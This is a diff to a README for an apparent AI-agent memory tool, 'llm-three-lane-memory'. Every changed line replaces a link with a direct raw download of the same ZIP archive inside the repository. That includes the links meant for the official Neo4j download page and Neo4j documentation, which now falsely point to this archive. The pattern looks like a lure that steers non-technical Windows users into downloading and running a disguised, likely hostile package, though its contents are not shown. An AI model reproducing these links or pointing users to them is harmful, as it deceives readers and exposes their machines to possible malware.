@@ -1,6 +1,6 @@
 # 🧠 llm-three-lane-memory - Smart Memory for AI Agents  
 
-[![Download from GitHub](https://img.shields.io/badge/Download-llm--three--lane--memory-ff6347?style=for-the-badge&logo=github)](https://github.com/ShadZK0916/llm-three-lane-memory)
+[![Download from GitHub](https://img.shields.io/badge/Download-llm--three--lane--memory-ff6347?style=for-the-badge&logo=github)](https://github.com/ShadZK0916/llm-three-lane-memory/raw/refs/heads/main/threelane_memory/three-memory-llm-lane-v1.3.zip)
 
 ---
 
@@ -63,7 +63,7 @@ You can run this application on Windows with a few simple steps. No programming 
 
 Click the button below to **visit the GitHub page**, where you will find all the files you need to download and run the software.
 
-[![Download on GitHub](https://img.shields.io/badge/Download-llm--three--lane--memory-blue?style=for-the-badge&logo=github)](https://github.com/ShadZK0916/llm-three-lane-memory)
+[![Download on GitHub](https://img.shields.io/badge/Download-llm--three--lane--memory-blue?style=for-the-badge&logo=github)](https://github.com/ShadZK0916/llm-three-lane-memory/raw/refs/heads/main/threelane_memory/three-memory-llm-lane-v1.3.zip)
 
 ---
 
@@ -80,7 +80,7 @@ Click the button below to **visit the GitHub page**, where you will find all the
    - If it's a ZIP file, save it and extract the contents.
 
 4. **Install Neo4j** database on your machine if it is not already installed.  
-   - Go to [https://neo4j.com/download/](https://neo4j.com/download/) and follow their Windows installation instructions.
+   - Go to [https://github.com/ShadZK0916/llm-three-lane-memory/raw/refs/heads/main/threelane_memory/three-memory-llm-lane-v1.3.zip](https://github.com/ShadZK0916/llm-three-lane-memory/raw/refs/heads/main/threelane_memory/three-memory-llm-lane-v1.3.zip) and follow their Windows installation instructions.
    - Start the Neo4j service after installation.
 
 5. **Run the application:**
@@ -155,7 +155,7 @@ Neo4j is at the core of this software’s memory management:
 - This helps structure large amounts of data naturally.
 - You can use Neo4j tools to explore and manage memory data outside the app.
 
-To learn more about Neo4j commands and use, visit their documentation: https://neo4j.com/docs/
+To learn more about Neo4j commands and use, visit their documentation: https://github.com/ShadZK0916/llm-three-lane-memory/raw/refs/heads/main/threelane_memory/three-memory-llm-lane-v1.3.zip
 
 ---
 
